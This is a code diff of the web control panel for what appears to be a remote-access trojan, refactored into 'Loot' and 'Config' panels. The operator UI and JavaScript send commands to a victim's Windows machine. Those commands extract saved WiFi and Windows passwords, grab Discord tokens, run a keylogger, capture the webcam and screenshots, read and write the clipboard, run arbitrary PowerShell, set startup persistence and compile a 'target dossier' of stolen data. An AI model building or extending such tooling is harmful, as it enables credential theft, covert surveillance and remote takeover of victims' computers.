-      <span class="lb">PS:</span>
-      <input class="inp" id="psIn" placeholder="ps command" style="flex:1;max-width:180px" spellcheck="false">
-      <button class="btn btn-a btn-sm" onclick="runPS()">Run</button>
-      <span class="sp">|</span>
-      <button class="btn btn-g btn-sm" onclick="loadSys()">Sys Info</button>
-    </div>
-    <div id="sysGrid" class="grid" style="margin-bottom:.4rem;display:none"></div>
-    <div id="sysOut" class="scroll-out"><div class="loading">System ready</div></div>
-    <div id="sysErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-pw">
-    <div class="bar"><button class="btn btn-o" onclick="loadPW()">🔑 Extract Passwords</button><span style="color:var(--txt2);font-size:.7rem">WiFi + Windows Creds</span></div>
-    <div id="pwOut" class="scroll-out"><div class="loading">Click to extract</div></div>
-    <div id="pwErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-net">
-    <div class="bar"><button class="btn btn-c" onclick="loadNet()">🌐 Network Info</button></div>
-    <div id="netOut" class="scroll-out"><div class="loading">Click to get network info</div></div>
-    <div id="netErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-svc">
-    <div class="bar"><button class="btn btn-pu" onclick="loadSvc()">⚙ List Services</button><span id="svcCnt" style="color:var(--txt2);font-size:.7rem"></span></div>
-    <div id="svcOut" class="scroll-out"><div class="loading">Click to list services</div></div>
-    <div id="svcErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-app">
-    <div class="bar"><button class="btn btn-a" onclick="loadApps()">📦 Installed Apps</button><span style="color:var(--txt2);font-size:.7rem">May take a moment</span></div>
-    <div id="appOut" class="scroll-out"><div class="loading">Click to list apps</div></div>
-    <div id="appErr" class="err"></div>
-  </div>
-
+  <!-- FILES: File browser -->
   <div class="panel" id="p-files">
     <div class="drop-zone" id="dropZ" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="handleDrop(event)">
-      <span>Drop files or <a onclick="document.getElementById('fileP').click()" style="color:var(--acc);cursor:pointer">browse</a></span>
+      <span>Drop files or <a onclick="document.getElementById('fileP').click()" style="color:var(--accent);cursor:pointer">browse</a></span>
       <input type="file" id="fileP" multiple style="display:none" onchange="handleFP(this)">
     </div>
     <div class="files" id="filesB"><div class="loading">Browse a directory</div></div>
     <div id="filesErr" class="err"></div>
   </div>
 
-  <div class="panel" id="p-cam">
-    <div class="bar"><button class="btn btn-p" onclick="takeCam()">📷 Capture Webcam</button></div>
-    <div id="camOut"><div class="loading">Click to capture</div></div>
-    <div id="camErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-tokens">
-    <div class="bar"><button class="btn btn-d" onclick="grabTok()">🔑 Grab Discord Tokens</button></div>
-    <div id="tokOut" class="scroll-out"><div class="loading">Click to grab tokens</div></div>
-    <div id="tokErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-host">
+  <!-- LOOT: Passwords, Tokens, Keylogger, Host, Network, Services, Apps, Clipboard -->
+  <div class="panel" id="p-loot">
     <div class="bar">
-      <button class="btn btn-c" onclick="loadHost()">💻 Host Info</button>
-      <button class="btn btn-g" onclick="loadEnv()">📋 Env Vars</button>
-      <button class="btn btn-g" onclick="takeSSAll()">🖼 All Monitors</button>
+      <span class="lb">Extraction Tools</span>
+      <button class="btn btn-p btn-sm" onclick="loadHost()">Host</button>
+      <button class="btn btn-a btn-sm" onclick="loadNet()">Network</button>
+      <button class="btn btn-g btn-sm" onclick="loadSvc()">Services</button>
+      <button class="btn btn-g btn-sm" onclick="loadApps()">Apps</button>
     </div>
-    <div id="hostGrid" class="grid" style="margin-bottom:.4rem;display:none"></div>
-    <div id="hostOut" class="scroll-out"><div class="loading">Click for host info</div></div>
-    <div id="hostErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-keylog">
-    <div class="bar">
-      <button class="btn btn-d btn-sm" id="klStart" onclick="startKL()">▶ Start</button>
-      <button class="btn btn-o btn-sm" id="klStop" onclick="stopKL()" style="display:none">■ Stop</button>
-      <button class="btn btn-g" onclick="dumpKL()">📋 Dump</button>
-      <span id="klStat" style="color:var(--txt2);font-size:.7rem">Stopped</span>
-      <button class="btn btn-g btn-sm" onclick="document.getElementById('klOut').innerHTML='<div class=\\'loading\\'>Dump keys</div>'" style="margin-left:auto">Clear</button>
-    </div>
-    <div id="klOut" class="scroll-out"><div class="loading">Start keylogger</div></div>
-    <div id="klErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-log">
-    <div class="bar">
-      <button class="btn btn-a" onclick="loadLog()">⟳ Refresh</button>
-      <button class="btn btn-g" onclick="document.getElementById('logOut').innerHTML='<div class=\\'loading\\'>Cleared</div>'">Clear</button>
-    </div>
-    <div id="logOut" class="scroll-out"><div class="loading">Loading log...</div></div>
-    <div id="logErr" class="err"></div>
-  </div>
-
-  <div class="panel" id="p-settings">
-    <div class="bar">
-      <span class="lb" style="font-weight:600;color:var(--acc)">Settings</span>
-    </div>
-    <div style="padding:8px 12px">
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
-        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Startup</span>
-        <button class="btn btn-g btn-sm" id="setStartupBtn" onclick="toggleStartup()">...</button>
-        <span id="setStartupTxt" style="font-size:.7rem;color:var(--txt2)">Loading...</span>
+    <div class="loot-grid">
+      <div class="loot-card">
+        <div class="head"><span>Passwords</span><button class="btn btn-p btn-sm" onclick="loadPW()">Grab</button></div>
+        <div class="body" id="pwOut"><div class="loading">Click Grab</div></div>
+        <div id="pwErr" class="err"></div>
       </div>
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
-        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Persistence</span>
-        <span id="setPersistTxt" style="font-size:.7rem;color:var(--txt2)">Checking...</span>
+      <div class="loot-card">
+        <div class="head"><span>Discord Tokens</span><button class="btn btn-d btn-sm" onclick="grabTok()">Grab</button></div>
+        <div class="body" id="tokOut"><div class="loading">Click Grab</div></div>
+        <div id="tokErr" class="err"></div>
       </div>
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
-        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Live Monitor</span>
-        <select class="sel" id="setLiveMon" style="width:60px" onchange="setLiveMon()">
-          <option value="0">M1</option><option value="1">M2</option><option value="2">M3</option><option value="3">M4</option>
-        </select>
-      </div>
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
-        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Quality</span>
-        <input type="range" id="setQuality" min="5" max="50" value="25" style="width:100px;accent-color:var(--acc)" oninput="setQVal.textContent=this.value">
-        <span id="setQVal" style="font-size:.7rem;color:var(--txt2);min-width:1.5rem">25</span>
-        <button class="btn btn-g btn-sm" onclick="setLiveQ()">Set</button>
-      </div>
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:6px">
-        <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Scale</span>
-        <select class="sel" id="setScale" style="width:60px">
-          <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
-        </select>
-        <button class="btn btn-g btn-sm" onclick="setLiveS()">Set</button>
-      </div>
-      <div style="border-top:1px solid rgba(255,255,255,.06);padding-top:12px;margin-top:4px">
-        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
-          <span style="font-size:.8rem;min-width:90px;color:var(--txt2)">Remote PC</span>
-          <span id="setPCName" style="font-size:.7rem;color:var(--acc)"></span>
+      <div class="loot-card">
+        <div class="head"><span>Keylogger</span>
+          <div style="display:flex;gap:3px">
+            <button class="btn btn-g btn-sm" id="klStart" onclick="startKL()" style="font-size:.6rem">Rec</button>
+            <button class="btn btn-d btn-sm" id="klStop" onclick="stopKL()" style="display:none;font-size:.6rem">Stop</button>
+            <button class="btn btn-g btn-sm" onclick="dumpKL()" style="font-size:.6rem">Dump</button>
+          </div>
         </div>
-        <button class="btn btn-d btn-sm" onclick="uninstallClient()" style="font-size:.7rem">Uninstall & Remove</button>
-        <div id="setErr" class="err" style="margin-top:6px"></div>
+        <div class="head" style="border-top:1px solid var(--border);font-size:.65rem"><span id="klStat" style="color:var(--text2)">Stopped</span></div>
+        <div class="body" id="klOut"><div class="loading">Start keylogger</div></div>
+        <div id="klErr" class="err"></div>
+      </div>
+      <div class="loot-card">
+        <div class="head"><span>Clipboard</span>
+          <div style="display:flex;gap:3px">
+            <button class="btn btn-g btn-sm" onclick="getClip()" style="font-size:.6rem">Read</button>
+            <input class="inp" id="clipIn" placeholder="write..." style="flex:1;min-width:60px;font-size:.65rem">
+            <button class="btn btn-a btn-sm" onclick="setClip()" style="font-size:.6rem">Set</button>
+          </div>
+        </div>
+        <div class="head" style="border-top:1px solid var(--border);font-size:.65rem">
+          <span class="lb">Host Info</span>
+          <button class="btn btn-g btn-sm" onclick="loadEnv()" style="font-size:.6rem">Env Vars</button>
+          <button class="btn btn-g btn-sm" onclick="takeSSAll()" style="font-size:.6rem">All SS</button>
+        </div>
+        <div id="hostGrid" class="grid" style="display:none;padding:.3rem"></div>
+        <div class="body" id="hostOut"><div class="loading">Click Host</div></div>
+        <div id="hostErr" class="err"></div>
+      </div>
+    </div>
+    <div id="netOut" class="scroll-out" style="margin-top:.4rem;display:none"></div>
+    <div id="netErr" class="err"></div>
+    <div id="svcOut" class="scroll-out" style="margin-top:.4rem;display:none"></div>
+    <div id="svcErr" class="err"></div>
+    <div id="appOut" class="scroll-out" style="margin-top:.4rem;display:none"></div>
+    <div id="appErr" class="err"></div>
+  </div>
+
+  <!-- CONFIG: Power + Settings + Dossier + Log -->
+  <div class="panel" id="p-config">
+    <div class="bar">
+      <span class="lb">Power</span>
+      <button class="btn btn-d btn-sm" onclick="sysCmd('shutdown')">Shutdown</button>
+      <button class="btn btn-o btn-sm" onclick="sysCmd('restart')">Restart</button>
+      <button class="btn btn-g btn-sm" onclick="sysCmd('lock')">Lock</button>
+      <button class="btn btn-g btn-sm" onclick="sysCmd('logoff')">Logoff</button>
+      <span class="sp">|</span>
+      <span class="lb">Vol</span>
+      <input type="range" id="volSl" min="0" max="100" value="50" style="width:60px;accent-color:var(--accent);height:2px" oninput="volD.textContent=this.value">
+      <span id="volD" style="font-size:.7rem;width:1.5rem">50</span>
+      <button class="btn btn-g btn-sm" onclick="sendVol()">Set</button>
+      <span class="sp">|</span>
+      <span class="lb">Wall</span>
+      <input class="inp" id="wallIn" placeholder="C:\path\img.jpg" style="flex:1;max-width:140px">
+      <button class="btn btn-a btn-sm" onclick="setWall()">Set</button>
+      <span class="sp">|</span>
+      <button class="btn btn-g btn-sm" onclick="showMsg()">MsgBox</button>
+    </div>
+    <div id="sysGrid" class="grid" style="margin-bottom:.4rem;display:none"></div>
+    <div id="sysOut" class="scroll-out"><div class="loading">Config ready</div></div>
+    <div id="sysErr" class="err"></div>
+    <div class="loot-grid" style="margin-top:.5rem">
+      <div class="loot-card">
+        <div class="head"><span>Dossier</span><button class="btn btn-d btn-sm" id="doxBtn" onclick="runDox()">Generate</button></div>
+        <div class="body" style="max-height:none">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:3px;margin-bottom:6px;font-size:.65rem">
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxHost" checked>Host</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxSys" checked>System</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxNet" checked>Network</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxPw" checked>Passwords</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxTok" checked>Tokens</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxEnv" checked>Env</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxProc" checked>Processes</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxSvc" checked>Services</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxApps" checked>Apps</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxClip">Clipboard</label>
+          </div>
+          <div id="doxProgress" style="display:none;margin-bottom:4px">
+            <div style="background:rgba(255,255,255,.06);border-radius:3px;height:4px;overflow:hidden"><div id="doxBar" style="background:var(--red);height:100%;width:0%;transition:width .3s"></div></div>
+          </div>
+          <div id="doxLog" style="font-size:.65rem;color:var(--text2);max-height:100px;overflow-y:auto"></div>
+          <div id="doxStatus" style="font-size:.65rem;color:var(--text2);margin-top:4px"></div>
+        </div>
+      </div>
+      <div class="loot-card">
+        <div class="head">
+          <span>Activity Log</span>
+          <button class="btn btn-g btn-sm" onclick="loadLog()" style="font-size:.6rem">⟳</button>
+        </div>
+        <div class="body" id="logOut"><div class="loading">Refresh</div></div>
+        <div id="logErr" class="err"></div>
+      </div>
+      <div class="loot-card">
+        <div class="head"><span>Settings</span></div>
+        <div class="body" style="max-height:none">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Startup</span>
+            <button class="btn btn-g btn-sm" id="setStartupBtn" onclick="toggleStartup()">...</button>
+            <span id="setStartupTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Persistence</span>
+            <span id="setPersistTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Live Mon</span>
+            <select class="sel" id="setLiveMon" style="width:50px;font-size:.68rem" onchange="setLiveMon()">
+              <option value="0">M1</option><option value="1">M2</option><option value="2">M3</option><option value="3">M4</option>
+            </select>
+            <span style="font-size:.7rem;min-width:30px;color:var(--text2)">Q</span>
+            <input type="range" id="setQuality" min="5" max="50" value="25" style="width:50px;accent-color:var(--accent);height:2px" oninput="setQVal.textContent=this.value">
+            <span id="setQVal" style="font-size:.65rem;color:var(--text2);min-width:1rem">25</span>
+            <button class="btn btn-g btn-sm" onclick="setLiveQ()" style="font-size:.6rem">Set</button>
+            <span class="lb">Scale</span>
+            <select class="sel" id="setScale" style="width:50px;font-size:.68rem">
+              <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
+            </select>
+            <button class="btn btn-g btn-sm" onclick="setLiveS()" style="font-size:.6rem">Set</button>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">PC</span>
+            <span id="setPCName" style="font-size:.7rem;color:var(--accent)"></span>
+            <span style="flex:1"></span>
+            <button class="btn btn-d btn-sm" onclick="uninstallClient()" style="font-size:.65rem">Uninstall</button>
+          </div>
+          <div id="setErr" class="err" style="margin-top:4px"></div>
+        </div>
       </div>
     </div>
   </div>
 
-  <div class="panel" id="p-dox">
-    <div class="bar">
-      <span class="lb" style="font-weight:600;color:var(--red)">Full Target Dossier</span>
-    </div>
-    <div style="padding:10px 12px">
-      <p style="font-size:.75rem;color:var(--txt2);margin-bottom:10px">Collects all available intel and downloads a complete dossier (.txt)</p>
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:12px">
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxHost" checked> Host Info</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxSys" checked> System Info</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxNet" checked> Network Info</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxPw" checked> Passwords</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxTok" checked> Discord Tokens</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxEnv" checked> Environment</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxProc" checked> Processes</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxSvc" checked> Services</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxApps" checked> Installed Apps</label>
-        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxClip"> Clipboard</label>
-      </div>
-      <div class="bar" style="gap:6px">
-        <button class="btn btn-d" id="doxBtn" onclick="runDox()">Generate Dossier</button>
-        <span id="doxStatus" style="font-size:.72rem;color:var(--txt2)"></span>
-      </div>
-      <div id="doxProgress" style="margin-top:8px;display:none">
-        <div style="background:rgba(255,255,255,.06);border-radius:4px;height:6px;overflow:hidden;margin-bottom:6px"><div id="doxBar" style="background:var(--red);height:100%;width:0%;transition:width .3s;border-radius:4px"></div></div>
-        <div id="doxLog" style="font-size:.7rem;color:var(--txt2);max-height:150px;overflow-y:auto"></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="panel" id="p-intel">
-    <div class="bar">
-      <span class="lb" style="font-weight:600;color:var(--acc)">Quick Intel</span>
-      <button class="btn btn-a btn-sm" onclick="loadIntel()">Refresh</button>
-    </div>
-    <div id="intelOut" style="padding:8px 12px"><div class="loading">Loading intel...</div></div>
-    <div id="intelErr" class="err"></div>
-  </div>
 </div>
 
 <script>
@@ -418,7 +360,7 @@ document.title=computer||'Client';
 const tabs=document.querySelectorAll('.tab');
 const panels={};
 document.querySelectorAll('.panel').forEach(p=>panels[p.id.replace('p-','')]=p);
-let currentTab='cmd';
+let currentTab='live';
 
 tabs.forEach(t=>{t.addEventListener('click',()=>switchTab(t.dataset.tab))});
 function switchTab(name){
@@ -427,20 +369,7 @@ function switchTab(name){
   if(panels[name])panels[name].classList.add('active');
   currentTab=name;
   if(name==='files'&&!g_fp)browseDir('');
-  if(name==='proc')loadProc();
-  if(name==='settings')loadSettings();
-  if(name==='intel')loadIntel();
 }
-
-document.addEventListener('keydown',e=>{
-  if(e.ctrlKey&&e.key>='1'&&e.key<='9'){
-    e.preventDefault();const names=['cmd','ss','live','proc','sys','pw','net','svc','app'];const idx=parseInt(e.key)-1;
-    if(idx<names.length&&names[idx])switchTab(names[idx]);
-  }
-  if(e.ctrlKey&&e.key==='r'){e.preventDefault();if(currentTab==='proc')loadProc();else if(currentTab==='log')loadLog();}
-  // Ctrl+Enter in cmd input
-  if(e.ctrlKey&&e.key==='Enter'){const inp=document.getElementById('cmdIn');if(inp)runCmd();}
-});
 
 // === sendAndWait ===
 let g_fe=null;
@@ -474,9 +403,9 @@ async function runCmd(){
 function copyCmdOut(){navigator.clipboard.writeText(document.getElementById('cmdOut').textContent).then(()=>toast('Output copied'))}
 function clrCmd(){document.getElementById('cmdOut').textContent='Ready.'}
 
-// === Screenshot ===
-async function takeSS(){const el=document.getElementById('ssOut');const mon=document.getElementById('monSel').value;const r=await saw('screenshot',mon,el,'ssErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
-async function takeCam(){const el=document.getElementById('camOut');const ee=document.getElementById('camErr');ee.style.display='none';const r=await saw('webcam','',el,'camErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
+// === Screenshot / Webcam / Tokens ===
+async function takeSS(){const el=document.getElementById('liveOut');const mon=document.getElementById('monSel').value;const r=await saw('screenshot',mon,el,'ssErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
+async function takeCam(){const el=document.getElementById('liveOut');const ee=document.getElementById('camErr');ee.style.display='none';const r=await saw('webcam','',el,'camErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
 async function grabTok(){const el=document.getElementById('tokOut');const ee=document.getElementById('tokErr');ee.style.display='none';const r=await saw('discord_tokens','',el,'tokErr');if(r&&r.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.75rem;line-height:1.5">'+esc(r.result)+'</pre>';else if(r)el.innerHTML='<div class="loading">No tokens</div>';}
 
 // === Live Screen ===
@@ -521,24 +450,26 @@ async function loadProc(){const el=document.getElementById('procOut');const ee=d
 function renderProc(json){const el=document.getElementById('procOut');let e;try{e=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}if(!Array.isArray(e)){el.innerHTML='<div class="loading">Bad response</div>';return}gProc=e;document.getElementById('procCnt').textContent=e.length+' procs';filterProc()}
 function filterProc(){const q=document.getElementById('procSearch').value.toLowerCase();const el=document.getElementById('procOut');const f=gProc.filter(e=>(e.n||'').toLowerCase().includes(q));if(!f.length){el.innerHTML='<div class="loading">No matches</div>';return}let html='<table class="proc-t"><thead><tr><th>Process</th><th>PID</th><th></th></tr></thead><tbody>';f.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pnm">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkl"><button class="btn btn-d btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">✕</button></td></tr>'});html+='</tbody></table>';el.innerHTML=html}
 async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!confirm('Kill '+name+' (PID '+pid+')?'))return;const el=document.getElementById('procOut');const r=await saw('kill_process',String(pid),el,'procErr');if(r&&r.result==='ok')loadProc();else if(r)toast('Failed: '+r.result)}
+let g_procTableStyle='proc-t';
+document.head.insertAdjacentHTML('beforeend','<style>.proc-t{width:100%;border-collapse:collapse;font-family:\'JetBrains Mono\',\'SF Mono\',Consolas,monospace;font-size:.7rem}.proc-t th{background:rgba(0,0,0,.2);color:var(--text2);padding:.25rem.5rem;text-align:left;border-bottom:1px solid var(--border);position:sticky;top:0;font-weight:600;font-size:.6rem;text-transform:uppercase;letter-spacing:.05em}.proc-t td{padding:.15rem.5rem;border-bottom:1px solid rgba(255,255,255,.02)}.proc-t tr:hover{background:rgba(88,100,255,.03)}.proc-t .pid{color:var(--text2);width:3rem}.proc-t .pnm{color:var(--text)}.proc-t .pkl{width:2.5rem;text-align:center}</style>');
 
-// === System ===
-async function sysCmd(t){const el=document.getElementById('sysOut');if(t==='shutdown'||t==='restart')if(!confirm(t+'?'))return;const r=await saw(t,'',el,'sysErr');if(r)el.innerHTML='<div style="color:var(--grn)">✓ '+t+'</div>'}
-function showMsg(){const t=prompt('Msg:');if(!t)return;const ti=prompt('Title:','Remote');const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';saw('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:var(--grn)">✓ Sent</div>'})}
+// === System Commands ===
+async function sysCmd(t){const el=document.getElementById('sysOut');if(t==='shutdown'||t==='restart')if(!confirm(t+'?'))return;const r=await saw(t,'',el,'sysErr');if(r)el.innerHTML='<div style="color:var(--green)">✓ '+t+'</div>'}
+function showMsg(){const t=prompt('Msg:');if(!t)return;const ti=prompt('Title:','Remote');const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';saw('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:var(--green)">✓ Sent</div>'})}
 async function getClip(){const el=document.getElementById('sysOut');const r=await saw('clipboard','',el,'sysErr');if(r)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
 async function getIdle(){const el=document.getElementById('sysOut');const r=await saw('idle','',el,'sysErr');if(r)el.innerHTML='Idle: '+esc(r.result)+'s'}
 async function getUp(){const el=document.getElementById('sysOut');const r=await saw('uptime','',el,'sysErr');if(r)el.innerHTML='Uptime: '+esc(r.result)+'s ('+Math.floor(parseInt(r.result||'0')/3600)+'h)'}
-async function runPS(){const c=document.getElementById('psIn').value.trim();if(!c)return;const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>PS...</div>';const r=await saw('powershell',c,el,'sysErr');if(r)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
-async function loadSys(){const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('system_info','',el,'sysErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('sysGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM Total</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="l">'+(dk.t/1024).toFixed(1)+' GB total</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--grn)">✓ System info</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
-async function sendVol(){const v=document.getElementById('volSl').value;const el=document.getElementById('sysOut');await saw('volume',v,el,'sysErr');el.innerHTML='<div style="color:var(--grn)">Vol: '+v+'</div>'}
-async function setWall(){const p=document.getElementById('wallIn').value.trim();if(!p)return;const el=document.getElementById('sysOut');const r=await saw('wallpaper',p,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--grn)">Wallpaper set</div>'}
-async function setClip(){const t=document.getElementById('clipIn').value;if(!t)return;const el=document.getElementById('sysOut');const r=await saw('clipboard_write',t,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--grn)">Clipboard written</div>'}
+async function runPS(){const c=document.getElementById('psIn').value.trim();if(!c)return;const el=document.getElementById('cmdOut');el.innerHTML+='\n❯ PS> '+c+'\n';const r=await saw('powershell',c,el,'cmdErr');if(r)el.innerHTML+=(r.result||'(no output)')+'\n';el.scrollTop=el.scrollHeight}
+async function loadSys(){const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('system_info','',el,'sysErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('sysGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM Total</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="l">'+(dk.t/1024).toFixed(1)+' GB total</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--green)">✓ System info</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
+async function sendVol(){const v=document.getElementById('volSl').value;const el=document.getElementById('sysOut');await saw('volume',v,el,'sysErr');el.innerHTML='<div style="color:var(--green)">Vol: '+v+'</div>'}
+async function setWall(){const p=document.getElementById('wallIn').value.trim();if(!p)return;const el=document.getElementById('sysOut');const r=await saw('wallpaper',p,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--green)">Wallpaper set</div>'}
+async function setClip(){const t=document.getElementById('clipIn').value;if(!t)return;const el=document.getElementById('sysOut');const r=await saw('clipboard_write',t,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--green)">Clipboard written</div>'}
 
-// === Passwords, Network, Services, Apps ===
-async function loadPW(){const el=document.getElementById('pwOut');const ee=document.getElementById('pwErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Extracting...</div>';const r=await saw('passwords','',el,'pwErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>';toast('Passwords extracted')}}
